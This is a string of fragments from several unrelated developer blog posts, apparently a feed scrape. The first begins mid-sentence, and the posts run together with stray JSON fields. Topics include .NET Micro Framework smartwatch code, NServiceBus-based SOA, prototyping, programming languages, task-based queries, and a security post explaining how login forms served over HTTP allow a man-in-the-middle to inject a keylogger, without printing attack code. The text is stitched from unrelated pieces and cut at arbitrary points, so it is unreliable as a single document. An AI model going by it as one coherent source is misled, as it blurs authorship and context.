we're talking about!</p><p>You've got total control over the screen and what can be displayed. You could create any watch face that you could imagine (that would fit on the screen) because you have a Bitmap to draw to.</p><p>The .NET Micro Framework has no fonts<em>loaded</em>by default, but I can include them as resources. There's some\"<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~msdn.microsoft.com/en-us/library/cc533019.aspx\">tinyfnt</a>\" files in C:\\Program Files (x86)\\Microsoft .NET Micro Framework\\v4.3\\Fonts or I could download or make some myself. Even better I can<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~informatix.miloush.net/microframework/Utilities/TinyFontTool.aspx\">use the TinyFontTool from Miloush</a>.</p><p>I can load a font from a resource like this:</p><pre class=\"brush: csharp; toolbar: false; auto-links: false;\">font = Resources.GetFont(Resources.FontResources.small);</pre><p>and then later in my UpdateTime() method, Draw the time on my binary clock screen.</p><pre class=\"brush: csharp; toolbar: false; auto-links: false;\">_bitmap.DrawText(DateTime.Now.ToString(\"HH:mm:ss\"), font, Color.White, 45, 15);</pre><p>Run my emulator again and I have the time printed as well!</p><p><img title=\"Now my AGENT Smart Watch has the time printed above the Binary Clock\"style=\"display: inline\"alt=\"Now my AGENT Smart Watch has the time printed above the Binary Clock\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_11.png\"width=\"315\"height=\"438\"/></p><p>The only real\"microframework-ism\" in the code is that the watch face doesn't want to use a lot of power, so you should\"go to sleep.\" It's the same as if you were writing a console app. If your main() function ends, then your app will end! But, since this is a watch face, we want it to run all the time, so, we start a 1 second timer, then sleep the main() forever. Everything interesting happens as an event on a background thread. (The watch can control the lifetime and tombstone or kill the watch face if you're doing other things.)</p><pre class=\"brush: csharp; toolbar: false; auto-links: false;\">public static void Main()<br>{<br>_bitmap = new Bitmap(Bitmap.MaxWidth, Bitmap.MaxHeight);<br>_font = Resources.GetFont(Resources.FontResources.small);<br><br>// display the time immediately<br>UpdateTime(null);<br><br>// set up timer to refresh time every minute<br>DateTime currentTime = DateTime.Now;<br>TimeSpan dueTime = new TimeSpan(0); // beginning of next minute<br>TimeSpan period = new TimeSpan(0, 0, 0, 1, 0); // update time every minute<br>_updateClockTimer = new Timer(UpdateTime, null, dueTime, period); // start our minute timer<br><br>_button = new InterruptPort(HardwareProvider.HwProvider.GetButtonPins(Button.VK_SELECT),<br>false,<br>Port.ResistorMode.PullDown,<br>Port.InterruptMode.InterruptEdgeBoth);<br>_button.OnInterrupt += _button_OnInterrupt;<br>// go to sleep; time updates will happen automatically every minute<br>Thread.Sleep(Timeout.Infinite);<br>}</pre><p>That last part is interesting. You've got two event handlers here, the one to UpdateTime every second and then one to watch for the Button getting pressed. You want the watch app to be event-driven...it needs to do as<strike>little as possible</strike>NOTHING until it's time to do something. This InterruptPort is watching for the the middle button (the VK_SELECT button). ResisterMode.PullDown means the button will show\"1\" or<em>true</em>when it's pressed. InterruptEdgeBoth means I get events when the button is pressed AND when it goes up.</p><h3>Go make Watch Apps!</h3><p>Here's another cool watch face from<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://www.facebook.com/media/set/?set=vb.239788096166290&type=2\">Dylan Mazurek</a>next to the Big Digits example:</p><p><img title=\"PixelFace example Watch for AGENT Smart Watch\"style=\"display: inline\"alt=\"PixelFace example Watch for AGENT Smart Watch\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_14.png\"width=\"315\"height=\"438\"/> <img title=\"BigDigits example Watch for AGENT Smart Watch\"style=\"display: inline\"alt=\"BigDigits example Watch for AGENT Smart Watch\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_17.png\"width=\"315\"height=\"438\"/></p><p>And finally, here's an animated concept for a World Time face that<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/Gutworks\">Steve Bulgin</a>made for Pete Brown as well as another<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/Gutworks\">Steve</a>concept below:</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/Gutworks\"><img src=\"http://hanselman.com/blog/content/binary/agentsmartwatchworldwatchface.gif\"/></a></p><p>The next step will be more than watch faces, it will be watch utilities and apps.

I learned a lot, and I'm happy with a lot of the feedback I've gotten over the years. But the time has come to move on. I want to get back to writing more code instead of writing about writing code.

There's quite a few posts I surely want to keep around, but certainly not all of them. For now, I'm going to keep the blog up so everything stays available but after a while, I'm gonna shut it down. I might keep up some kind of static archive of my favorite posts, or I might just put them on GitHub in MarkDown format.

I’ve blogged many times about the problems with layering, so I won’t go into that now beyond to say that you really, REALLY, should avoid it.</p><h3>A short intro to SOA, done right</h3><p>In the “vertical services” approach I espouse, you often see components from multiple services deployed to any given endpoint. While these services usually don’t need to communicate with each other at all, occasionally you’ll see them leaving “breadcrumbs” behind for each other – things like UserId or OrderId in the session. What’s especially important is that these IDs are accessible even before the entity is finalized – this enables each service to collect its own data without needing any other service to know about that data.</p><p>In an ecommerce environment, we would see one service owning money, another the product catalog (excluding prices, those would be owned by the previous service), another service owning the customers’ payment info (credit cards, etc), and yet another owning shipping addresses – all of these separate from the one that owns the shopping cart. Let’s call these Finance, Catalog, Payment, Shipping, and finally Shopping – just so that we have something to reference later.</p><h3>The API</h3><p>While we can do all sorts of cool browser composition with the UI in our own system, enabling each service to collect and display its own information, if we want to expose an API for clients to call, we wouldn’t want to force those clients to have to make a separate call to each service in order to make a purchase. Instead, we’d want something that looks like:</p><p>MakePurchase(Guid orderId, Dictionary<Guid, int> cart, CreditCardInfo cc, Address shippingAddress)</p><p>In case you were wondering, the service which owns the definition of this API is different from all of the above services – it is a service that is primarily technical in nature and is responsible for things like integration and data transformations. I call this service IT/Ops.</p><h3>Getting the data from the API to the services</h3><p>So, we don’t want any of our business-centric services to know about anybody else’s data structures, so that leaves it to IT/Ops to pass the data to them. The thing is that we still want to do that in the most loosely-coupled way possible – with messaging being a good candidate for that.</p><p>So, what we’ll do is have IT/Ops send a message containing the data to the other services, but with a slight twist.</p><p>Here’s what the code would look like with <a href=\"http://particular.net/nservicebus\">NServiceBus</a>:<br/><br/></p><pre class=\"csharpcode\">Bus.SendLocal(<span class=\"kwrd\">new</span> Order { Id = orderId, Cart = cart,CreditCard = cc, ShippingAddress = shippingAddress });</pre><p><br/><br />Why the SendLocal?</p><p>So that the components from the other services can all run together with IT/Ops in the same process giving a nice tight deployment model.</p><p>Before we get to the services, let me show you the Order class – specifically, the interfaces it implements:<br/><br/></p><pre class=\"csharpcode\"><span class=\"kwrd\">public</span> <span class=\"kwrd\">class</span> Order : ShoppingOrder, PaymentsOrder, ShippingOrder{<span class=\"kwrd\">public</span> Guid OrderId { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }<span class=\"kwrd\">public</span> Dictionary&lt;Guid, <span class=\"kwrd\">int</span>&gt; Cart { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }<span class=\"kwrd\">public</span> CreditCardInfo CreditCard { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }<span class=\"kwrd\">public</span> Address ShippingAddress { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }}<span class=\"kwrd\">public</span> <span class=\"kwrd\">interface</span> ShoppingOrder{Guid OrderId { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }Dictionary&lt;Guid, <span class=\"kwrd\">int</span>&gt; Cart { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }}<span class=\"kwrd\">public</span> <span class=\"kwrd\">interface</span> PaymentsOrder{Guid OrderId { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }CreditCardInfo CreditCard { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }}<span class=\"kwrd\">public</span> <span class=\"kwrd\">interface</span> ShippingOrder{Guid OrderId { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }Address ShippingAddress { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }}</pre><p><br/><br/><br />Each of the above interfaces represents the data that each service cares about. Therefore, each service will provide an assembly that handles that message/data and persists it to its database, like this:<br/><br/></p><pre class=\"csharpcode\"><span class=\"kwrd\">public</span> <span class=\"kwrd\">class</span> ShoppingAPIHandler : IHandleMessages&lt;ShoppingOrder&gt;{<span class=\"kwrd\">public</span> <span class=\"kwrd\">void</span> Handle(ShoppingOrder message){<span class=\"rem\">//persist to shopping service db</span>}}<span class=\"kwrd\">public</span> <span class=\"kwrd\">class</span> PaymentsAPIHandler : IHandleMessages&lt;PaymentsOrder&gt;{<span class=\"kwrd\">public</span> <span class=\"kwrd\">void</span> Handle(PaymentsOrder message){<span class=\"rem\">//persist to payment service db</span>}}<span class=\"kwrd\">public</span> <span class=\"kwrd\">class</span> ShippingAPIHandler : IHandleMessages&lt;ShippingOrder&gt;{<span class=\"kwrd\">public</span> <span class=\"kwrd\">void</span> Handle(ShippingOrder message){<span class=\"rem\">//persist to shipping service db</span>}}</pre><p><br/><br/></p><p>Since the Order object being sent is a polymorphic match for all of these interfaces, NServiceBus knows to invoke all of these handlers. By the way, if you care about the order of invocation, then you can control that as well (but I won’t get into that here).</p><p>Also, since all of these handler assemblies are deployed to the same endpoint, and the Order object is sent just once, this means that all the handlers will be invoked in a single transaction on a single thread – either all of them succeeding, or all failing. Since they’re all connected on the same Order Id, referential integrity can be preserved as well.</p><h3>Wrapping up</h3><p>When you are building a system on SOA principles, you’ll often find that you need a service like IT/Ops to handle data transformation and other broker-centric tasks. While much of SOA is based on the Bus Architectural Style – meaning primarily publish/subscribe interaction between services – that doesn’t mean that your business-centric services cannot have their components deployed in the same process.</p><p>I’d go so far as to say that if you aren’t deploying components from multiple services in process with each other at least some of the time then it’s quite likely that your service boundaries are probably incorrect.</p><p>Anyway, I hope you found this post interesting.

We take security seriously. Our measures are robust.” (and other random, unquantifiable claims)</p><p>Loading login forms over HTTP renders any downstream transport layer security almost entirely useless. Rather than just tell you what’s wrong with this, let me show precisely why this is with a site that implements this pattern:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/nm-85-bDP6c?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>How’s that for simple?! What people forget about SSL is that<a href=\"http://www.troyhunt.com/2011/01/ssl-is-not-about-encryption.html\">it’s not about encryption</a>. Well that’s one feature of secure sockets, another really essential one is<em>integrity</em>insofar as it gives us confidence that the website content hasn’t been manipulated.<em>Anything you load over an HTTP connection can be easily changed by a man in the middle</em>which is why it’s absolutely essential to load those login forms over a secure connection. OWASP is very specific about this in<a href=\"http://www.troyhunt.com/2011/11/owasp-top-10-for-net-developers-part-9.html\">part 9 of their Top 10 web application security risks</a>and summarise it well in the<a href=\"https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet\">transport layer protection cheat sheet</a>:</p><blockquote><p>The initial login page, referred to as the \"login landing page\", must be served over TLS. Failure to utilize TLS for the login landing page allows an attacker to modify the login form action, causing the user's credentials to be posted to an arbitrary location.</p></blockquote><p>It’s not just Woolworths doing this, in fact it’s extremely common and you’ll see it on<a href=\"http://www.godaddy.com/\">GoDaddy</a>:</p><p><img width=\"742\" height=\"412\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"GoDaddy login page loaded over HTTP\" src=\"http://lh5.ggpht.com/-R3oO1habrgc/UZoNCGOyApI/AAAAAAAAFVk/f_oRmxXp2HE/image5.png?imgmax=800\" border=\"0\"></p><p>On<a href=\"http://www.pandora.com/\">Pandora</a>:</p><p><img width=\"742\" height=\"412\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Pandora login page loaded over HTTP\" src=\"http://lh6.ggpht.com/-j0-9eUp6Duo/UZoNC8NU1JI/AAAAAAAAFVs/htmQtMnpu04/image8.png?imgmax=800\" border=\"0\"></p><p>And even on the<a href=\"http://www.ft.com/\">Financial Times</a>:</p><p><img width=\"741\" height=\"413\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Financial Times login page loaded over HTTP\" src=\"http://lh5.ggpht.com/-XB1UNVWqNSA/UZoNDirIWgI/AAAAAAAAFV0/xi0Lb_lkJSE/image61.png?imgmax=800\" border=\"0\"></p><p>I’m calling out these simply because they’re high-profile sites yet they all load the login forms over HTTP and post to HTTPS. Why aren’t they implementing SSL correctly? Most likely convenience; customers can login direct from the homepage and they can have it delivered over HTTP. Mind you Pandora links off to a login page so why they couldn’t just serve that securely to begin with is a bit of a mystery.</p><p>So how should it be done? Load the login form over HTTPS, either by linking to a dedicated login page or popping it up in a separate window (although there’s a UX argument against this). Even better, just load the whole site over HTTPS! Yes, there are some barriers to HTTPS across the board (managing certs in web farms, dependencies on assets from third parties, impact on CDNs, etc) but it sure solves the login form issue. Check out<a href=\"http://www.netflix.com\">Netflix’s approach</a>– straight into HTTPS, job done!</p><p>The other issue with the examples above is that potential manipulation of the content aside, missing HTTPS on the login form leads to exactly the discussion this post opened with – users not believing their credentials are protected. All the messaging we’ve been delivering to website users since the early days of the web about checking for the padlock in the browser address bar goes down the drain because it’s simply not there! There’s no assurance that their credentials will be protected and it’s a real shame to dilute such an important security message.</p><p>As for how the exploit in the video works, it’s just a simple<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler script</a>to inject the keylogger before the body tag closes off. The keylogger itself is<a href=\"https://code.google.com/p/javascript-keylogger/\">over on Google Code</a>, the only code I wrote to incorporate it was the script tags you saw at the end of the video and the “Hack Yourself” website which receives the logged keys. It really is that simple.</p><p>Whilst Fiddler is good for demonstration purposes, clearly an actual weaponised attack would work differently but the principle is the same: When unencrypted traffic passes through a node on the network – NIC, ethernet cable, router, proxy, ISP, etc. – it may be observed or manipulated by an attacker. This isn’t theoretical, there are many precedents such as<a href=\"http://www.thetechherald.com/articles/Tunisian-government-harvesting-usernames-and-passwords/12429/\">the Tunisian government harvesting Facebook credentials en mass</a>.</p><p>This is all a bit odd really, I mean these sites have gone to the effort of implementing<em>some</em>SSL but then blown it by loading those login forms over HTTP. As we saw with Woolworths, posting over a secure connection is completely useless if there’s no integrity in the login form itself, an attacker may already have the credentials by then if the connection is compromised which is the very risk they all implemented SSL to protect from in the first place!</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/2MOCxoW2JyE\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1169}}

and wrote a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.cognitiveinheritance.com/post/Using-Target-Specific-Code-in-a-Portable-Library.aspx\">blog post</a>about how you can do this with abstraction and (preferably) dependency injection.<blockquote><p>On at least 2 occasions recently, I have heard speakers tell their audience that you cannot reference a target-specific .NET library (such as a .NET Framework 4.5 library) from a Portable Class Library. While this is technically true, it doesn't tell nearly the whole story. Even though we can't reference target-specific libraries, we can still USE these libraries. We can call their methods and access their properties under the right circumstances. We can gain access to these libraries via an abstraction. My preferred method of doing this is...Dependency Injection.</p></blockquote><h3>Cross Platform .NET Coolness</h3><p>There's lots of great examples of code reuse,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselminutes.com/343/draw-a-stickman-epic-an-iphone-android-and-windows-8-game-with-monogame\">like the podcast I did with the folks who wrote\"Draw a Stickman EPIC.\"</a>This app has 95%+ code reuse, all written in C# and is available in every App Store there is.

Even if you go through some process of doing mock-ups, sometimes users can’t really know what they want until they can interact with working software.</p><p>This is one of the advantages of an agile approach that focuses on getting working software in the hands of users very early. It allows us to mitigate the risk of us building the wrong system.</p><h3>Pitfalls</h3><p>The mistake here is believing that this needs to be done in a production-ready manner, using all of the super-scalability and highly reliable infrastructural elements in our target deployment environment. </p><p>While there is value in building real functionality on top of your production infrastructure to learn more about the challenges in doing that and in that process, refining the API of your platform, baking more capabilities into it, etc, the problem is that you are slowing down the important learning of what system needs to be built.</p><p>Decouple those two things.</p><h3>Build one to throw away.</h3><p>Sometimes, the way to be most effective is to be somewhat inefficient.</p><p>Once you’ve gotten your users to the point that they can point at a piece of working software and say, “Yes – build me that”, then you can go about building it the right way on top of your production platform.</p><p>Let me go a step further, just to be crystal clear.</p><p>Do not unit-test that code. Do not use TDD, DDD, CQRS, Event Sourcing, SOA, etc.</p><p>Just get it done.</p><h3>Architecture</h3><p>You also want to have a good understanding of the use cases in your system before you make too many big architectural decisions (where that might even be just 1 decision, but you only find out after the fact). Some use cases are architecturally significant – many aren’t. This falls under the “just enough architecture up-front”, but is really very dependent on the experience and skills of the people on your team so I really can’t give you anything more prescriptive.</p><p>Of course, there’s another risk around this approach.</p><h3>Organizational Dysfunction</h3><p>In some organizations, there isn’t enough of an understanding or appreciation of the difference between production-ready software and a prototype. I think we’ve all been through this at one time or another. If users see “the software” works, we might be forced to deploy the prototype – all our protests for naught.</p><p>If this is the environment you’re in, don’t worry about it.</p><p>Seriously – don’t.</p><h3>Growing up</h3><p>You can explain to a child that fire is hot, and that they will get burned if they stick their hand in it, but all of that is theoretical – it doesn’t really sink in, because they haven’t yet had a visceral experience of “hot”. </p><p>If the organization you’re in isn’t that mature yet, they’re going to have to get burned a couple of times until they learn. The only thing you can do as a responsible adult is to *try* to get them started with smaller burns so that they’ll learn the lessons with the minimal amount of pain.</p><p>Given that the people doing the learning are higher up the food-chain, you really don’t have much influence. Accept that and move on. If necessary, cover your assets – write an email containing the “meeting minutes” in which you describe the concerns that you raised and that the decision was made against your recommendations – but phrase it gently. Depending on the state of the economy and your network, it might be a good time to start job-hunting.</p><h3>In closing</h3><p>I said it before but it bears repeating:</p><p>Efficiency is secondary to effectiveness.</p><p>You want to make sure your headed in the right direction before putting the pedal to the metal.</p><p>Rework is to be accepted and, yes, even embraced.</p><p><a href=\"http://37signals.com/rework\">There’s even a book about it</a>.</p><p>Have fun.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=8snaEJKeQQg:Wlo-uQqqniA:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=8snaEJKeQQg:Wlo-uQqqniA:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=8snaEJKeQQg:Wlo-uQqqniA:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=8snaEJKeQQg:Wlo-uQqqniA:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=8snaEJKeQQg:Wlo-uQqqniA:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/8snaEJKeQQg\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1175}}

Words are language, code is language. Restricting yourself to one or two languages is limiting your cognitive abilities</p><p><img src='http://wekeroad.com/images/language_map.png'/></p><p><p><em>image from<a href=\"http://visual.ly/network-graph-programming-languages-influence\">http://visual.ly/network-graph-programming-languages-influence</a></em></p><h2>Words as a Conceptual Map</h2><p>There's a small bit of setup here - bear with me.<a href=\"http://www.radiolab.org/2010/aug/09/\">I relistened to one of my favorite RadioLab podcasts ('Words')</a>this weekend and had my mind blown, once again. They dug into<strong>what words mean</strong>to us and, according to the show, words are much more than expression vehicles.</p><p><strong>Words are the very structure of our higher reasoning</strong>.</p><p>In other words:<em>if you can't say it, you can't think it.</em>The words themselves are cognitive variables strung together to represent feeling, emotion, memory - abstract things made concrete by the words we put to them.</p><p>High-minded stuff and rather than regurgitate the whole show here - go listen if you haven't, it's very good. It left me quite inspired and I wondered if the the ideas in the show could extend to programming languages. Why not? Code is simply syntax laid on top of process that a machine needs to understand... hmmm....</p><p>We tell machines how to think - which directly reflects how we think. Writing code always seemed like such a\"machine-y\" thing to do, but I think that's not the case:<strong>Programming languages are true languages</strong>written for us to describe problems that a machine can understand.</p><p>These languages are stripped of nuance and imbued with functionality (loops, terse conditionals) for a myriad of problems.<em>How well do you speak code?</em></p><h2>A Thought Experiment</h2><p>Code is language, and how we solve problems with a given programming language directly relates to<strong>how we think in that language</strong>. This doesn't seem like an amazing revelation in and of itself - in fact I think you probably already understood this quite well.</p><p>But what if we reversed it? What if you couldn't think any other way - other than what that language<em>allowed you to think</em>. What if your coding language of choice<strong>was the abstraction over your programming thought process</strong>- that you actually lacked the mental faculties that lie outside of what that language can represent?</p><p>Let's say you walk into an interview and you get hit with a classic interview question (no, not FizzBuzz):<strong>write a routine that spits out Fibonacci numbers</strong>. It's something every dev has had to do at some point.</p><p>Now, slow your brain down and rewind. What language are you using to express this? What is that language<strong>allowing you to do</strong>.</p><p>If the only programming language you know is C# you're probably writing some LINQ in your mind and running a modulus. If you use Javascript you're probably doing something similar but maybe spread over two functions utilizing callbacks.</p><p>Rubyists out there might do something similar - favoring a more idiomatic approach with blocks/yield rather than a terse one-liner.</p><p><strong>Now write it using a Monad</strong>.</p><p><strong>Recursion?</strong></p><p>I'm sure a few of my readers could do all the above (LINQ, callbacks/blocks, Monad and Recursion) but I doubt that most of you can. This is due to the languages you know, the idioms they use, and<strong>the way those languages allow you to think about a problem</strong>.</p><h2>Expanding Your Thought Process</h2><p>I don't know anything about monads but I've done recursive programming in the past (sometimes not-intentionally). When I started using Ruby, I began to value the idiom of passing control back and forth using blocks and yield. You can do this in many languages - but for some reason it wasn't something I routinely did in C#.</p><p>The asynchronous nature of Javascript has awakened a part of my mind to evented programming. Again you can do this in many languages but it's idiomatic in Javascript and Node.</p><p>I can\"think\" in these terms and solve problems in ways I could never do when I knew only one language well (C#). At the time I liked the idea of\"going deep\" - of knowing a language so thoroughly that I could solve any problem with it and not clutter my mind with the different syntaxes of other languages.</p><p>I'm glad I didn't. And listening to that Radiolab podcast this last weekend made me understand why. I used to think it was that learning new languages would help me\"think differently\" but now I know it's more than that:<strong>I'm smarter now</strong>.</p><p>I'm not an egotistical guy and it hurts a bit to write that last paragraph - as if I'm suggesting that I'm smarter than people who know only one programming language -<strong>which is clearly not true</strong>. My point is only that<em>I'm smarter than I was 4 years ago</em>and the reason I think that is because I can solve problems in more ways than I could before and if my definition of\"intellect\" is accurate...</p><p><img src=\"/images/intellect.png\" alt=\"Definition of'Intellect'\"></p><p>... then yeah: I think it's OK to say I'm smarter than I was with respect to programming.</p><p>The thing I enjoy most about all of this is that I would never have thought about this until I heard that Radiolab podcast. They put the words to the very idea that words are our higher reasoning.</p><p>A lovely bit of recursive fun.</p><p><strong>Would I have recognized that recursion a few years ago? Hmmmm....</strong></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/PIz2b8ykqmw\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1179}}

Many are already beginning to understand the importance of task-based UIs and how that aligns to the underlying commands being sent, validated, and processed in the system as well as the benefits of messaging-centric infrastructure (like <a href=\"http://www.NServiceBus.com\">NServiceBus</a>) for handling those commands reliably. When it comes to queries, though, it isn’t nearly as well understood what it means for a query to be “task based”.</p><h3>Starting with CRUD</h3><p>Let’s start with a traditional CRUD application and work our way out from there.</p><p>In these environments, we often see users asking us to build “excel-like” screens that allow them to view a set of data as well as sort, filter, and group that data along various axes. While we might not get this requirement right away, after some time users begin to ask us to allow them to “save” a certain “query” that they have set up, providing it some kind of name.</p><p>That, right there, is a task-based query and it is the beginning of deeper domain insight.</p><h3>Pattern matching</h3><p>Any time a user is repeatedly running the same query (this can be once a day or some other unit of time) there is some scenario that the business is trying to identify and is using that user as a pattern-matching engine to see if the data indicates that that scenario has occurred.</p><p>It’s quite common for us to get a requirement to add some field (often a boolean or enum) to an entity which defaults to some value and then see that same field used in filtering other queries. These measures are sometimes instituted as a temporary stop-gap while a larger feature is being implemented, though (as the saying goes) there is nothing more permanent than a temporary solution.</p><h3>Where we developers go wrong</h3><p>The thing is, many developers don’t notice these sorts of things happening because we don’t actually look at the kinds of queries users are running.</p><p>One excellent technique to better understand a domain is to sit down with your users while they’re working and ask them, “what made you run that query just now?”, “why that specific set of filters?”. </p><p>What I’ve noticed over the years is that our users find very creative ways to achieve their business objectives <b><i>despite</i></b> the limitations of the system that they’re working with. We developers ultimately see these as requirements, but they are better interpreted as <b>workarounds</b>.</p><p>I’ll talk some more about how a software development organization should deal with these workarounds in a future post, but I want to focus back in on the queries for now.</p><p>Oh, and don’t get me started on caching or NoSQL, not that I think that those tools don’t provide value – they do, but they’re only relevant once you know which business problem you’re solving and why.</p><h3>Not all queries are created equal</h3><p>Even before bringing up the questions I described in the previous section, any time you get query-centric requirements the first question to ask is “how often will the user be running this specific query?”.</p><p>If the answer is that the <b>specific</b> query will be run periodically (every day, week, etc), then drill deeper to see what pattern the user will be looking for in the data. If the person you’re talking to doesn’t know to answer that question, then go find someone who does. Every periodic query I’ve seen has some pattern behind it – and in my conversations with thousands of other developers over the years, I’ve seen that this is not just my personal experience.</p><p>But there is a case where a query does get run repeatedly without there being a pattern behind it.</p><p>I know this sounds like I’m contradicting myself, but the distinction is the word “specific” that I emphasized above.</p><p>There are certain users who behave very differently from other users – these users are often doing what I call <b>research</b>, i.e. the “I don’t know what I’m looking for but I’ll know it when I see it” people.</p><p>These researchers tend to repeatedly query the data in the system however they tend to run different queries all the time. This is the reason why traditional data warehouse type solutions don’t tend to work well for them. Data warehouses are optimized for running specific queries repeatedly.</p><p>Keeping the Single-Responsibility Principle in mind – we should not try to create a single query mechanism that will address these two very different and independently evolving needs.</p><h3>And now on to Search</h3><p>Search is a feature that is needed in many systems and whose complexity is greatly underestimated.</p><p>While the developer community has taken some decent strides in understanding that search needs to be treated differently from other queries, the common Lucene/Solr solutions that are applied are often overwhelmed by the size of the data set on which the business operates.</p><p>The problem is compounded by our user population being spoiled by Google – that simple little text box and voila, exactly what you’re looking for magically appears instantaneously. They don’t understand (or care) how much engineering effort went into making that “just work”.</p><p>Lucene and Solr work well when your data set isn’t too large, and then they become pretty useless as the quality of their results degrades. The thing is that many of us in IT tend to work on projects where we have an unrealistically small data set that we use to test the system and, at these volumes, it looks like our solutions work great. But if you have 20 million customers, do you think a full text search on “Smith” is going to find just the right one?</p><p>Larger data sets require a <b>relevance engine</b> – something that feeds off of what users do <b>AFTER</b> the query to influence the results of future queries. Did the user page to the next screen? That needs to be fed back in. Did they click on one of the results? That needs to be fed back in too. Did they go back to the search and do another similar search right after looking at a result – that should possibly undo the previous feedback.</p><p>And that’s just relevance for beginners.</p><p>You know what makes Google, you know, Google? It’s that they have this absolutely massive data set of what users do after the query that informs which results they return when. You probably don’t have that. That and search is/was their main business for many years – I’m betting that it’s not your main business.</p><p>You should discuss this with your stakeholders the next time they ask for search functionality in your system.</p><h3>In closing</h3><p>I know that the common CQRS talking points tell you to keep your queries simple, but that doesn’t mean that simple is easy.</p><p>It takes a fair bit of domain understanding to figure out what the queries in the system are supposed to be – what tasks users are trying to achieve through these queries. And even when you do reach this understanding, convincing various business stakeholders to change the design of the UI to reflect these insights is far from easy.</p><p>It often seems like the reasonable solution to give our users everything, to not limit them in any way, and then they’ll be able to do anything. What ends up happening is that our users end up drowning in a sea of data, unable to see the forest for the trees, ultimately resulting in the company not noticing important trends quickly enough (or at all) and therefore making poor business decisions.</p><p>Even if your company doesn’t believe itself to be in “Big Data” territory, I’d suggest talking with the people on the “front lines” just in case. Many of them will report feeling overwhelmed by the quantity of stuff (to use the correct scientific term) they need to deal with.</p><p>It’s not about Lucene, Solr, OData, SSRS, or any other technology.</p><p>It’s on you.

